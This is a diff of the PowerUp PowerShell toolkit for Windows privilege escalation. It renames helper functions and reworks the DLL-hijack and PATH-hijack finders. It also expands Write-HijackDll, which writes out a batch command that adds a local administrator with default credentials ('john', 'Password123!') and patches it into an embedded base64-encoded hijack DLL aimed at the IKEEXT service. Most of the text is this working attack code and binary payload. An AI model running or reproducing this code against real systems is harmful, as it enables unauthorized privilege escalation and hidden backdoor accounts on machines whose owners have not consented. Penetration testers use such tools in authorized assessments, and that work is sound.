@@ -739,7 +739,7 @@ New-Struct. :P
 #
 ########################################################
 
-function Get-ModifiableFile {
+function Get-ModifiablePath {
 <#
     .SYNOPSIS
 
@@ -762,7 +762,7 @@ function Get-ModifiableFile {
 
     .EXAMPLE
 
-        PS C:\> '"C:\Temp\blah.bat" -f "C:\Temp\config.ini"' | Get-ModifiableFile
+        PS C:\> '"C:\Temp\blah.bat" -f "C:\Temp\config.ini"' | Get-ModifiablePath
 
         Path                       Permissions                IdentityReference
         ----                       -----------                -----------------
@@ -1403,7 +1403,7 @@ function Get-ModifiableServiceFile {
     .DESCRIPTION
 
         Enumerates all services by querying the WMI win32_service class. For each service,
-        it takes the pathname (aka binPath) and passes it to Get-ModifiableFile to determine
+        it takes the pathname (aka binPath) and passes it to Get-ModifiablePath to determine
         if the current user has rights to modify the service binary itself or any associated
         arguments. If the associated binary (or any configuration files) can be overwritten,
         privileges may be able to be escalated.
@@ -1421,7 +1421,7 @@ function Get-ModifiableServiceFile {
         $ServicePath = $_.pathname
         $ServiceStartName = $_.startname
 
-        $ServicePath | Get-ModifiableFile | ForEach-Object {
+        $ServicePath | Get-ModifiablePath | ForEach-Object {
 
             $ServiceRestart = Test-ServiceDaclPermission -PermissionSet 'Restart' -ServiceName $ServiceName
 
@@ -1958,7 +1958,7 @@ function Write-ServiceBinary {
             }
             else {
                 # create a local user and add it to the local specified group
-                $ServiceCommand = "net user $UserNameToAdd $PasswordToAdd /add && timeout /t 2 && net localgroup $LocalGroup $UserNameToAdd /add"
+                $ServiceCommand = "net user $UserNameToAdd $PasswordToAdd /add && timeout /t 5 && net localgroup $LocalGroup $UserNameToAdd /add"
             }
         }
     }
@@ -2142,7 +2142,7 @@ function Install-ServiceBinary {
             }
             else {
                 # create a local user and add it to the local specified group
-                $ServiceCommand = "net user $UserNameToAdd $PasswordToAdd /add && timeout /t 2 && net localgroup $LocalGroup $UserNameToAdd /add"
+                $ServiceCommand = "net user $UserNameToAdd $PasswordToAdd /add && timeout /t 5 && net localgroup $LocalGroup $UserNameToAdd /add"
             }
         }
     }
@@ -2158,7 +2158,7 @@ function Install-ServiceBinary {
 
         $ServiceDetails = Get-ServiceDetail -Service $TargetService
 
-        $ModifiableFiles = $ServiceDetails.PathName | Get-ModifiableFile
+        $ModifiableFiles = $ServiceDetails.PathName | Get-ModifiablePath
 
         if(-not $ModifiableFiles) {
             throw "Service binary '$($ServiceDetails.PathName)' for service $($ServiceDetails.Name) not modifiable by the current user."
@@ -2255,7 +2255,7 @@ function Restore-ServiceBinary {
 
         $ServiceDetails = Get-ServiceDetail -Service $TargetService
 
-        $ModifiableFiles = $ServiceDetails.PathName | Get-ModifiableFile
+        $ModifiableFiles = $ServiceDetails.PathName | Get-ModifiablePath
 
         if(-not $ModifiableFiles) {
             throw "Service binary '$($ServiceDetails.PathName)' for service $($ServiceDetails.Name) not modifiable by the current user."
@@ -2278,16 +2278,30 @@ function Restore-ServiceBinary {
 
 ########################################################
 #
-# .dll Hijacking
+# DLL Hijacking
 #
 ########################################################
 
-function Find-DLLHijack {
+function Find-ProcessDLLHijack {
 <#
     .SYNOPSIS
 
-        Checks all loaded modules for each process and returns locations
-        where a loaded module does not exist in the executable base path.
+        Finds all DLL hijack locations for currently running processes.
+
+        Author: @harmj0y
+        License: BSD 3-Clause
+
+    .DESCRIPTION
+
+        Enumerates all currently running processes with Get-Process (or accepts an
+        input process object from Get-Process) and enumerates the loaded modules for each.
+        All loaded module name exists outside of the process binary base path, as those
+        are DLL load-order hijack candidates.
+
+    .PARAMETER Process
+
+        A System.Diagnostics.Process object from Get-Process to enumerate for possible
+        DLL path hijack opportunities.
 
     .PARAMETER ExcludeWindows
 
@@ -2303,22 +2317,28 @@ function Find-DLLHijack {
 
     .EXAMPLE
 
-        PS C:\> Find-DLLHijack
+        PS C:\> Find-ProcessDLLHijack
 
-        Finds all hijackable DLL locations.
+        Finds possible hijackable DLL locations for all processes.
 
     .EXAMPLE
 
-        PS C:\> Find-DLLHijack -ExcludeWindows -ExcludeProgramFiles
+        PS C:\> Get-Process VulnProcess | Find-ProcessDLLHijack
 
-        Finds all hijackable DLL locations not in C:\Windows\* and
+        Finds possible hijackable DLL locations for the 'VulnProcess' processes.
+
+    .EXAMPLE
+
+        PS C:\> Find-ProcessDLLHijack -ExcludeWindows -ExcludeProgramFiles
+
+        Finds possible hijackable DLL locations not in C:\Windows\* and
         not in C:\Program Files\* or C:\Program Files (x86)\*
 
     .EXAMPLE
 
-        PS C:\> Find-DLLHijack -ExcludeOwned
+        PS C:\> Find-ProcessDLLHijack -ExcludeOwned
 
-        Finds .DLL hijacking opportunities for processes not owned by the
+        Finds possible hijackable DLL location for processes not owned by the
         current user.
 
     .LINK
@@ -2328,6 +2348,11 @@ function Find-DLLHijack {
 
     [CmdletBinding()]
     Param(
+        [Parameter(Position = 0, ValueFromPipeline = $True)]
+        [System.Diagnostics.Process]
+        [ValidateNotNullOrEmpty()]
+        $Process,
+
         [Switch]
         $ExcludeWindows,
 
@@ -2338,69 +2363,70 @@ function Find-DLLHijack {
         $ExcludeOwned
     )
 
-    $OrigError = $ErrorActionPreference
-    $ErrorActionPreference = "SilentlyContinue"
+    BEGIN {
+        # the known DLL cache to exclude from our findings
+        #   http://blogs.msdn.com/b/larryosterman/archive/2004/07/19/187752.aspx
+        $Keys = (Get-Item "HKLM:\System\CurrentControlSet\Control\Session Manager\KnownDLLs")
+        $KnownDLLs = $(ForEach ($name in $Keys.GetValueNames()) { $Keys.GetValue($name) }) | Where-Object { $_.EndsWith(".dll") }
 
-    # the known DLL cache to exclude from our findings
-    #   http://blogs.msdn.com/b/larryosterman/archive/2004/07/19/187752.aspx
-    $Keys = (Get-Item "HKLM:\System\CurrentControlSet\Control\Session Manager\KnownDLLs")
-    $KnownDLLs = $(ForEach ($name in $Keys.GetValueNames()) { $Keys.GetValue($name) }) | Where-Object { $_.EndsWith(".dll") }
+        $CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
 
-    # grab the current user
-    $CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+        # get the owners for all processes
+        $Owners = @{}
+        Get-WmiObject -Class win32_process | Where-Object {$_} | ForEach-Object { $Owners[$_.handle] = $_.getowner().user }
+    }
 
-    # get the owners for all processes
-    $Owners = @{}
-    Get-WmiObject -Class win32_process | Where-Object {$_} | ForEach-Object {$Owners[$_.handle] = $_.getowner().user}
+    PROCESS {
 
+        if($PSBoundParameters['Process']) {
+            $TargetProcesses = $Process | Where-Object { $_.Path }
+        }
+        else {
+            $TargetProcesses = Get-Process | Where-Object { $_.Path }
+        }
 
-    # iterate through all current processes that have a valid path
-    ForEach ($Process in Get-Process | Where-Object {$_.Path}) {
+        ForEach ($TargetProcess in $TargetProcesses) {
 
-        # get the base path for the process
-        $BasePath = $Process.Path | Split-Path -Parent
+            $BasePath = $TargetProcess.Path | Split-Path -Parent
 
-        # get all the loaded modules for this process
-        $LoadedModules = $Process.Modules
+            $LoadedModules = $TargetProcess.Modules
 
-        # pull out the owner of this process
-        $ProcessOwner = $Owners[$Process.id.tostring()]
+            $ProcessOwner = $Owners[$TargetProcess.Id.ToString()]
 
-        # check each loaded module
-        ForEach ($Module in $LoadedModules){
+            ForEach ($Module in $LoadedModules){
 
-            # create a basepath + loaded module
-            $ModulePath = "$BasePath\$($module.ModuleName)"
+                $ModulePath = "$BasePath\$($Module.ModuleName)"
 
-            # if the new module path
-            if ((-not $ModulePath.Contains("C:\Windows\System32")) -and (-not (Test-Path -Path $ModulePath)) -and ($KnownDLLs -NotContains $Module.ModuleName)) {
+                # if the module path doesn't exist in the process base path folder
+                if ((-not $ModulePath.Contains('C:\Windows\System32')) -and (-not (Test-Path -Path $ModulePath)) -and ($KnownDLLs -NotContains $Module.ModuleName)) {
 
-                $Exclude = $False
+                    $Exclude = $False
 
-                # check exclusion flags
-                if ( $ExcludeWindows.IsPresent -and $ModulePath.Contains("C:\Windows") ){
-                    $Exclude = $True
-                }
-                if ( $ExcludeProgramFiles.IsPresent -and $ModulePath.Contains("C:\Program Files") ){
-                    $Exclude = $True
-                }
-                if ( $ExcludeOwned.IsPresent -and $CurrentUser.Contains($ProcessOwner) ){
-                    $Exclude = $True
-                }
+                    if($PSBoundParameters['ExcludeWindows'] -and $ModulePath.Contains('C:\Windows')) {
+                        $Exclude = $True
+                    }
 
-                # output the process name and hijackable path if exclusion wasn't marked
-                if (-not $Exclude){
-                    $Out = New-Object PSObject
-                    $Out | Add-Member Noteproperty 'ProcessPath' $Process.Path
-                    $Out | Add-Member Noteproperty 'Owner' $ProcessOwner
-                    $Out | Add-Member Noteproperty 'HijackablePath' $ModulePath
-                    $Out
+                    if($PSBoundParameters['ExcludeProgramFiles'] -and $ModulePath.Contains('C:\Program Files')) {
+                        $Exclude = $True
+                    }
+
+                    if($PSBoundParameters['ExcludeOwned'] -and $CurrentUser.Contains($ProcessOwner)) {
+                        $Exclude = $True
+                    }
+
+                    # output the process name and hijackable path if exclusion wasn't marked
+                    if (-not $Exclude){
+                        $Out = New-Object PSObject
+                        $Out | Add-Member Noteproperty 'ProcessName' $TargetProcess.ProcessName
+                        $Out | Add-Member Noteproperty 'ProcessPath' $TargetProcess.Path
+                        $Out | Add-Member Noteproperty 'ProcessOwner' $ProcessOwner
+                        $Out | Add-Member Noteproperty 'ProcessHijackableDLL' $ModulePath
+                        $Out
+                    }
                 }
             }
         }
     }
-
-    $ErrorActionPreference = $OrigError
 }
 
 
@@ -2408,8 +2434,17 @@ function Find-PathHijack {
 <#
     .SYNOPSIS
 
-        Checks if the current %PATH% has any directories that are
-        writeable by the current user.
+        Finds all directories in the system %PATH% that are modifiable by the current user.
+
+        Author: @harmj0y
+        License: BSD 3-Clause
+
+    .DESCRIPTION
+
+        Enumerates the paths stored in Env:Path (%PATH) and filters each through Get-ModifiablePath
+        to return the folder paths the current user can write to. On Windows 7, if wlbsctrl.dll is
+        written to one of these paths, execution for the IKEEXT can be hijacked due to DLL search
+        order loading.
 
     .EXAMPLE
 
@@ -2425,59 +2460,7 @@ function Find-PathHijack {
     [CmdletBinding()]
     Param()
 
-    $OrigError = $ErrorActionPreference
-    $ErrorActionPreference = "SilentlyContinue"
-
-    $Paths = (Get-Item Env:Path).value.split(';') | Where-Object {$_ -ne ""}
-
-    ForEach ($Path in $Paths){
-
-        $Path = $Path.Replace('"',"")
-        if (-not $Path.EndsWith("\")){
-            $Path = $Path + "\"
-        }
-        $Path = [System.Environment]::ExpandEnvironmentVariables($Path)
-
-        # reference - http://stackoverflow.com/questions/9735449/how-to-verify-whether-the-share-has-write-access
-        $TestPath = Join-Path $Path ([IO.Path]::GetRandomFileName())
-
-        # if the path doesn't exist, try to create the folder before testing it for write
-        if(-not $(Test-Path -Path $Path)){
-            try {
-                # try to create the folder
-                $Null = New-Item -ItemType directory -Path $Path
-                echo $Null > $TestPath
-
-                $Out = New-Object PSObject
-                $Out | Add-Member Noteproperty 'HijackablePath' $Path
-                $Out | Add-Member Noteproperty 'AbuseFunction' "Write-HijackDll -OutputFile '$Path\wlbsctrl.dll' -Command '...'"
-                $Out
-            }
-            catch {}
-            finally {
-                # remove the directory
-                Remove-Item -Path $Path -Recurse -Force -ErrorAction SilentlyContinue
-            }
-        }
-        else{
-            # if the folder already exists
-            try {
-                echo $Null > $TestPath
-
-                $Out = New-Object PSObject
-                $Out | Add-Member Noteproperty 'HijackablePath' $Path
-                $Out | Add-Member Noteproperty 'AbuseFunction' "Write-HijackDll -OutputFile '$Path\wlbsctrl.dll' -Command '...'"
-                $Out
-            }
-            catch {}
-            finally {
-                # Try to remove the item again just to be safe
-                Remove-Item $TestPath -Force -ErrorAction SilentlyContinue
-            }
-        }
-    }
-
-    $ErrorActionPreference = $OrigError
+    Get-Item Env:Path | Select-Object -ExpandProperty Value | ForEach-Object { $_.split(';') } | Where-Object {$_ -and ($_ -ne '')} | Get-ModifiablePath
 }
 
 
@@ -2485,61 +2468,101 @@ function Write-HijackDll {
 <#
     .SYNOPSIS
 
-        Writes out a self-deleting 'debug.bat' file that executes a given command to
-        $env:Temp\debug.bat, and writes out a hijackable .dll that launches the .bat.
+        Patches in the path to a specified .bat (containing the specified command) into a 
+        pre-compiled hijackable C++ DLL writes the DLL out to the specified ServicePath location.
 
-    .PARAMETER OutputFile
+    .DESCRIPTION
 
-        File name to write the .dll to.
+        First builds a self-deleting .bat file that executes the specified -Command or local user,
+        to add and writes the.bat out to -BatPath. The BatPath is then patched into a pre-compiled 
+        C++ DLL that is built to be hijackable by the IKEEXT service. There are two DLLs, one for 
+        x86 and one for x64, and both are contained as base64-encoded strings. The DLL is then 
+        written out to the specified OutputFile.
 
-    .PARAMETER Command
+    .PARAMETER DllPath
 
-        Command to run in the .bat launcher.
+        File name to write the generated DLL out to.
+
+    .PARAMETER Architecture
+
+        The Architecture to generate for the DLL, x86 or x64. If not specified, PowerUp
+        will try to automatically determine the correct architecture.
 
     .PARAMETER BatPath
 
-        Path to the .bat for the .dll to launch.
+        Path to the .bat for the DLL to launch.
 
-    .PARAMETER Arch
+    .PARAMETER UserName
 
-        Architeture of .dll to generate, x86 or x64. If not specified, will try to
-        automatically determine.
+        The [domain\]username to add. If not given, it defaults to "john".
+        Domain users are not created, only added to the specified localgroup.
+
+    .PARAMETER Password
+
+        The password to set for the added user. If not given, it defaults to "Password123!"
+
+    .PARAMETER LocalGroup
+
+        Local group name to add the user to (default of 'Administrators').
+
+    .PARAMETER Credential
+
+        A [Management.Automation.PSCredential] object specifying the user/password to add.
+
+    .PARAMETER Command
+
+        Custom command to execute instead of user creation.
 #>
 
     [CmdletBinding()]
     param(
         [Parameter(Mandatory = $True)]
         [String]
-        $OutputFile,
-
-        [Parameter(Mandatory = $True)]
-        [String]
-        $Command,
+        [ValidateNotNullOrEmpty()]
+        $DllPath,
 
         [String]
+        [ValidateSet('x86', 'x64')]
+        $Architecture,
+
+        [String]
+        [ValidateNotNullOrEmpty()]
         $BatPath,
 
         [String]
-        $Arch
+        $UserName = 'john',
+
+        [String]
+        $Password = 'Password123!',
+
+        [String]
+        $LocalGroup = 'Administrators',
+
+        [Management.Automation.PSCredential]
+        $Credential,
+
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $Command
     )
 
     function local:Invoke-PatchDll {
     <#
         .SYNOPSIS
 
-            Patches a string in a binary byte array.
+            Helpers that patches a string in a binary byte array.
 
         .PARAMETER DllBytes
 
-            Binary blog to patch.
+            The binary blob to patch.
 
-        .PARAMETER FindString
+        .PARAMETER SearchString
 
-            String to search for to replace.
+            The string to replace in the blob.
 
         .PARAMETER ReplaceString
 
-            String to replace FindString with
+            The string to replace SearchString with.
     #>
 
         [CmdletBinding()]
@@ -2550,85 +2573,102 @@ function Write-HijackDll {
 
             [Parameter(Mandatory = $True)]
             [String]
-            $FindString,
+            $SearchString,
 
             [Parameter(Mandatory = $True)]
             [String]
             $ReplaceString
         )
 
-        $FindStringBytes = ([system.Text.Encoding]::UTF8).GetBytes($FindString)
-        $ReplaceStringBytes = ([system.Text.Encoding]::UTF8).GetBytes($ReplaceString)
+        $ReplaceStringBytes = ([System.Text.Encoding]::UTF8).GetBytes($ReplaceString)
 
         $Index = 0
         $S = [System.Text.Encoding]::ASCII.GetString($DllBytes)
-        $Index = $S.IndexOf($FindString)
+        $Index = $S.IndexOf($SearchString)
 
-        if($Index -eq 0)
-        {
-            throw("Could not find string $FindString !")
+        if($Index -eq 0) {
+            throw("Could not find string $SearchString !")
         }
 
-        for ($i=0; $i -lt $ReplaceStringBytes.Length; $i++)
-        {
+        for ($i=0; $i -lt $ReplaceStringBytes.Length; $i++) {
             $DllBytes[$Index+$i]=$ReplaceStringBytes[$i]
         }
 
         return $DllBytes
     }
 
+    if($PSBoundParameters['Command']) {
+        $BatCommand = $Command
+    }
+    else {
+        if($PSBoundParameters['Credential']) {
+            $UserNameToAdd = $Credential.UserName
+            $PasswordToAdd = $Credential.GetNetworkCredential().Password
+        }
+        else {
+            $UserNameToAdd = $UserName
+            $PasswordToAdd = $Password
+        }
+
+        if($UserNameToAdd.Contains('\')) {
+            # only adding a domain user to the local group, no user creation
+            $BatCommand = "net localgroup $LocalGroup $UserNameToAdd /add"
+        }
+        else {
+            # create a local user and add it to the local specified group
+            $BatCommand = "net user $UserNameToAdd $PasswordToAdd /add && timeout /t 5 && net localgroup $LocalGroup $UserNameToAdd /add"
+        }
+    }
+
     # generate with base64 -w 0 hijack32.dll > hijack32.b64
     $DllBytes32 = "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